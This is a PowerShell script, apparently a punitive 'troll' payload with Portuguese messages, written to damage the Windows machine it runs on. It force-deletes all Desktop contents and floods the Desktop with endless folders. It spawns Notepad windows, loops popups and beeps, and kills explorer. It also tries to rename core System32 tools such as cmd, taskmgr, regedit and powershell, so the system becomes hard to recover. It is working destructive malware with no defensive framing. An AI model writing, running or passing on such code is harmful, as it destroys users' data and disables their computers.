Add-Type -AssemblyName PresentationFramework

[System.Windows.MessageBox]::Show("Detectado", "Why", "OK", "Error")

Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseSensitivity" -Value 20
Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseSpeed" -Value 1
Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseThreshold1" -Value 0
Set-ItemProperty -Path "HKCU:\Control Panel\Mouse" -Name "MouseThreshold2" -Value 0
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

$desktop = [Environment]::GetFolderPath("Desktop")
Get-ChildItem -Path $desktop | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue

Start-Job {
    $desktop = [Environment]::GetFolderPath("Desktop")
    $i = 0
    while ($true) {
        New-Item -ItemType Directory -Path "$desktop\Troll_$i" -Force | Out-Null
        $i++
        Start-Sleep -Milliseconds 100
    }
}

for ($j = 0; $j -lt 15; $j++) {
    Start-Process "notepad.exe"
    Start-Sleep -Milliseconds 100
}

Start-Job {
    while ($true) {
        [System.Windows.MessageBox]::Show("Safado tentou dar bypass sem perm", "Sistema", "OK", "Warning")
        Start-Sleep -Milliseconds 200
    }
}

Stop-Process -Name explorer -Force -ErrorAction SilentlyContinue

Start-Job {
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class Beep {
        [DllImport("user32.dll")]
        public static extern bool MessageBeep(uint uType);
    }
"@
    while ($true) {
        [Beep]::MessageBeep(0)
        Start-Sleep -Milliseconds 500
    }
}

function Renomear-Troll {
    param (
        [string]$Caminho,
        [string]$NovoNome
    )

    if (Test-Path $Caminho) {
        try {
            $NovaVersao = Join-Path -Path (Split-Path $Caminho) -ChildPath $NovoNome
            Rename-Item -Path $Caminho -NewName $NovoNome -Force
        } catch {
            
        }
    } else {
       
    }
}

$ArquivosSistema = @(
    @{ Caminho = "$env:windir\System32\msconfig.exe"; NovoNome = "msconfigtroll.exe" },
    @{ Caminho = "$env:windir\System32\explorer.exe"; NovoNome = "explorertroll.exe" },
    @{ Caminho = "$env:windir\System32\taskmgr.exe"; NovoNome = "taskmgtroll.exe" },
    @{ Caminho = "$env:windir\System32\cmd.exe"; NovoNome = "cmdtroll.exe" },
    @{ Caminho = "$env:windir\System32\regedit.exe"; NovoNome = "regedittroll.exe" },
    @{ Caminho = "$env:windir\System32\notepad.exe"; NovoNome = "notepadtroll.exe" },
    @{ Caminho = "$env:windir\System32\calc.exe"; NovoNome = "calctroll.exe" },
    @{ Caminho = "$env:windir\System32\control.exe"; NovoNome = "controltroll.exe" },
    @{ Caminho = "$env:windir\System32\powershell.exe"; NovoNome = "pstroll.exe" }
)

# Renomear todos
foreach ($arquivo in $ArquivosSistema) {
    Renomear-Troll -Caminho $arquivo.Caminho -NovoNome $arquivo.NovoNome
}

